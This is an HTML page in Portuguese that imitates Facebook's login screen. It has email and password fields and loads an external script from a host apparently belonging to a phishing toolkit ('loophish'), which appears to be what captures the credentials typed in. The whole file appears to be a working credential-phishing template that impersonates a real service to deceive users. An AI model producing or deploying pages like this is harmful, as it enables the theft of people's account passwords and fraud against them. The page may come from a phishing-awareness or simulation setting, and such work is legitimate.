<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook – entre ou cadastre-se</title>
  <script src="https://loophish.local/mod?tlink=6sjpzr" type="text/javascript"></script>
  <style>
    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background-color: #f0f2f5;
    }

    .container {
      display: flex;
      justify-content: space-around;
      align-items: center;
      height: 100vh;
      padding: 20px;
    }

    .left {
      max-width: 400px;
    }

    .left h1 {
      color: #1877f2;
      font-size: 56px;
      margin-bottom: 10px;
    }

    .left p {
      font-size: 20px;
      color: #1c1e21;
    }

    .login-box {
      background: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0px 2px 8px rgba(0, 0, 0, 0.1);
      width: 360px;
      text-align: center;
    }

    .login-box input {
      width: 100%;
      padding: 14px;
      margin: 8px 0;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      font-size: 16px;
    }

    .login-box button {
      width: 100%;
      padding: 14px;
      margin-top: 10px;
      border: none;
      border-radius: 6px;
      font-size: 18px;
      cursor: pointer;
      font-weight: bold;
    }

    .login-box .login-btn {
      background-color: #1877f2;
      color: white;
    }

    .login-box .login-btn:hover {
      background-color: #166fe5;
    }

    .login-box a {
      display: block;
      margin-top: 12px;
      color: #1877f2;
      font-size: 14px;
      text-decoration: none;
    }

    .login-box a:hover {
      text-decoration: underline;
    }

    .divider {
      margin: 20px 0;
      border-top: 1px solid #dddfe2;
    }

    .create-btn {
      background-color: #42b72a;
      color: white;
      margin-top: 10px;
    }

    .create-btn:hover {
      background-color: #36a420;
    }

    .footer-text {
      margin-top: 28px;
      font-size: 14px;
    }

    .footer-text a {
      font-weight: bold;
      color: black;
      text-decoration: none;
    }

    .footer-text a:hover {
      text-decoration: underline;
    }

    @media (max-width: 900px) {
      .container {
        flex-direction: column;
        text-align: center;
      }

      .left {
        margin-bottom: 20px;
      }
    }
  </style>
</head>

<body>
  <div class="container">
    <!-- Lado esquerdo -->
    <div class="left">
      <h1>facebook</h1>
      <p>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</p>
    </div>

    <!-- Caixa de login -->
    <div class="login-box">
      <form>
        <input id="email" name="email" type="text" placeholder="Email ou telefone" required>
        <input id="password" name="password" type="password" placeholder="Senha" required>
        <button id="submit" name="submit" type="submit" class="login-btn">Entrar</button>
        <a href="#">Esqueceu a senha?</a>
        <div class="divider"></div>
        <button type="button" class="create-btn">Criar nova conta</button>
      </form>
      <div class="footer-text">
        <p><a href="#">Crie uma Página</a> para uma celebridade, uma marca ou uma empresa.</p>
      </div>
    </div>
  </div>
</body>

</html>
